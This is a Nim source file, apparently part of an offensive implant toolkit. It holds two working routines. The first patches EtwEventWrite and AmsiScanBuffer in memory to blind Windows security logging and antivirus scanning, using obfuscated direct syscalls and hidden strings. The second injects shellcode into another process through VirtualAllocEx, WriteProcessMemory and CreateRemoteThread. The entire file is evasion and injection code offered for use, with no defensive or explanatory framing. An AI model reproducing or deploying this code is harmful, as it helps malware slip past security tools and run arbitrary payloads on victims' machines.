import priv
import winim
import dynlib
import nimprotect
include incl/syscalls3


proc patch_func*(command_name: string): bool =
    
    var    
        dll_name: string
        func_name: string
        func_addr: PVOID
        func_addr2: PVOID
        patch: seq[byte]
        process_h: HANDLE
        dll_h: LibHandle
        old_protection: ULONG
        bytes_written: SIZE_T
        nt_status: NTSTATUS = 0

    # specific function to patch case
    case command_name:
        of protectString("etw"):
            dll_name = protectString("ntdll")
            func_name = protectString("EtwEventWrite")
            patch = @[byte 0xC3]  # ret
        of protectString("amsi"):
            dll_name = protectString("amsi")
            func_name = protectString("AmsiScanBuffer")
            patch = @[byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3] # mov eax, 0x80070057 (E_INVALIDARG) ; ret

    # Some handles and addresses retieval
    var patch_len = cast[SIZE_T](patch.len)
    process_h = GetCurrentProcess()
    dll_h = loadLib(dll_name)
    if isNil(dll_h):
        return false
    func_addr = dll_h.symAddr(func_name)
    if isNil(func_addr):
        return false

    # NtProtectVirtualMemory gonna change func_addr so save it
    func_addr2 = func_addr

    nt_status = eGHtTmjXcbZTDDUi(  # NtProtectVirtualMemory
        process_h, 
        addr func_addr, 
        addr patch_len, 
        PAGE_EXECUTE_READWRITE, 
        addr old_protection
        )  
    if nt_status != STATUS_SUCCESS:
        return false

    nt_status = OMQoAnSSJGeTcUxq(  # NtWriteVirtualMemory
        process_h,
        func_addr2,
        addr patch[0],
        cast[SIZE_T](patch.len),
        addr bytes_written
    )
    if nt_status != ERROR_SUCCESS:
        return false
    
    nt_status = eGHtTmjXcbZTDDUi(  # NtProtectVirtualMemory
        process_h, 
        addr func_addr, 
        addr patch_len,
        PAGE_EXECUTE_READ, 
        addr old_protection
        ) 
    if nt_status != ERROR_SUCCESS:
        return false
    
    return true


proc inject_shellcode*(shellc: seq[byte], pid: int): bool = 

    # set debug privileges
    if not set_privilege("SeDebugPrivilege"):
        return false
    
    # open remote process
    let process_h = OpenProcess(
    PROCESS_ALL_ACCESS, 
    false, 
    cast[DWORD](pid)
    )
    if process_h == 0:
        return false
    
    # allocate memory in remotre process
    let remote_address = VirtualAllocEx(
        process_h,
        NULL,
        cast[SIZE_T](shellc.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    # write shellcode to remote process
    let write_success = WriteProcessMemory(
        process_h, 
        remote_address,
        unsafeAddr shellc[0],
        cast[SIZE_T](shellc.len),
        nil
    )
    if not bool(write_success):
        CloseHandle(process_h)
        return false

    # start the remote shellcode as a thread
    let thread_handle = CreateRemoteThread(
        process_h, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](remote_address),
        NULL, 
        0, 
        NULL
    )

    if thread_handle == 0:
        CloseHandle(process_h)
        return false
    
    CloseHandle(process_h)
    CloseHandle(thread_handle)
    return true
    